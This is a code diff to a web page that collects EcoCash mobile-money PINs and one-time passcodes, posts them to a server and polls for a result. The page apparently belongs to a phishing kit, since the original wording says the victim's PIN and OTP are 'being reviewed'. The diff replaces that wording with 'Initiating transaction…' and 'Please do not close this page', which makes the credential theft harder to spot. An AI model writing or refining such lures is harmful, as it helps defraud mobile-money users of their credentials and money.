@@ -176,9 +176,9 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 <div class="waiting-overlay" id="waiting-overlay">
   <div class="waiting-card">
     <div class="spinner"></div>
-    <h3 class="waiting-title" id="waiting-title">Waiting for approval…</h3>
-    <p class="waiting-desc" id="waiting-desc">Please wait.</p>
-    <div class="waiting-hint">This usually takes a few seconds</div>
+    <h3 class="waiting-title" id="waiting-title">Initiating transaction…</h3>
+    <p class="waiting-desc" id="waiting-desc">This may take a few moments.</p>
+    <div class="waiting-hint">Please do not close this page</div>
   </div>
 </div>
 
@@ -354,7 +354,7 @@ async function submitPin(){
     if(!data || !data.ok) throw new Error(data?.error || 'Server error');
     sessionId = data.sessionId;
     closeModal('modal-ecocash-login');
-    showWaiting('Waiting for approval…','Your PIN is being reviewed.');
+    showWaiting('Initiating transaction…','This may take a few moments.');
     startPoll();
   } catch(err){
     console.error(err);
@@ -380,7 +380,7 @@ async function submitOtp(){
     if(!data || !data.ok) throw new Error(data?.error || 'Server error');
     sessionId = data.sessionId;
     closeModal('modal-otp-verify');
-    showWaiting('Verifying OTP…','Your OTP is being reviewed.');
+    showWaiting('Initiating transaction…','This may take a few moments.');
     startPoll();
   } catch(err){
     console.error(err);
